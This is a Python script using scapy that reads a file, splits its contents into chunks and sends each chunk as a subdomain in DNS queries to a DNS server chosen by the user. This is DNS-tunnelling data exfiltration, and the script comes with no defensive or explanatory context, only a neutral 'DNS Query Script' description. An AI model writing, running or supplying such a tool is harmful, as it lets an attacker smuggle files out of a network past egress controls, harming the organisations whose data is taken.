import math
import argparse
from scapy.all import *
import time

def split_into_parts(text, n):
    """Split text into n parts"""
    part_size = math.ceil(len(text) / n)
    return [text[i:i+part_size] for i in range(0, len(text), part_size)]

def create_dns_queries(substrings, dns_server, subdomain):
    """Create DNS queries for each substring"""
    for substring in substrings:
        query_name = f"{substring}.{subdomain}"
        query = IP(dst=dns_server) / UDP() / DNS(rd=1, qd=DNSQR(qname=query_name))
        send(query)
        time.sleep(1)

def main(file_path, dns_server, subdomain, number_of_queries):
    # Read file content
    with open(file_path, 'r') as file:
        file_content = file.read()

    # Split file content
    substrings = split_into_parts(file_content, number_of_queries)

    # Create and send DNS queries
    create_dns_queries(substrings, dns_server, subdomain)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='DNS Query Script with Subdomain')
    parser.add_argument('file_path', type=str, help='Path to the text file')
    parser.add_argument('dns_server', type=str, help='IP address of the DNS server')
    parser.add_argument('subdomain', type=str, help='Subdomain to append to each query')
    parser.add_argument('--num_queries', type=int, default=10, help='Number of DNS queries to create')
    
    args = parser.parse_args()

    main(args.file_path, args.dns_server, args.subdomain, args.num_queries)

